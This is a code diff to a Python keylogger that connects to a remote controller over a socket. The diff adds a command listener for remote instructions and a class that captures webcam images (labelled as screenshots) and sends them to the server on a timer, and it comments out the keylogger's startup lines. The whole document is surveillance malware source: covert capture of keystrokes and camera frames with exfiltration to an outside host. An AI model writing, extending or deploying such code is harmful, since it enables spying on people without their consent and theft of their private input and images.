@@ -14,6 +14,45 @@ SEND_REPORT_EVERY = 10  # in seconds
 s = socket.socket()
 s.connect((SERVER_HOST, SERVER_PORT))
 
+#receiving commands
+class Command:
+    def __init__(self):
+        self.command = None
+
+    def receive(self):
+        self.command = s.recv(BUFFER_SIZE).decode()
+        return self.command
+
+    def execute(self):
+        while True:
+            self.receive()
+            if self.command == "screenshot":
+                print("Taking screenshot")
+            elif self.command == "exit":
+                s.close()
+                break
+
+
+
+class Screenshot:
+    def __init__(self):
+        self.screenshot = None
+
+    def take_screenshot(self):
+        self.screenshot = cv2.VideoCapture(0)
+        ret, frame = self.screenshot.read()
+        if ret:
+            _, img_encoded = cv2.imencode(".jpg", frame)
+            return img_encoded.tobytes()
+        return None
+
+    def start(self):
+        screenshot = self.take_screenshot()
+        if screenshot:
+            s.sendall(screenshot)
+        Timer(interval=SEND_REPORT_EVERY, function=self.start).start()
+    
+
 class Keylogger:
     def __init__(self, interval, server_socket, report_method="file"):
         self.interval = interval
@@ -50,10 +89,10 @@ class Keylogger:
 
 
 
-keylogger = Keylogger(interval=SEND_REPORT_EVERY, server_socket=s)
-keylogger_thread = threading.Thread(target=keylogger.start)
-keylogger_thread.start()
-keylogger_thread.join()
+# keylogger = Keylogger(interval=SEND_REPORT_EVERY, server_socket=s)
+# keylogger_thread = threading.Thread(target=keylogger.start)
+# keylogger_thread.start()
+# keylogger_thread.join()
 
 
-s.close()
+# s.close()
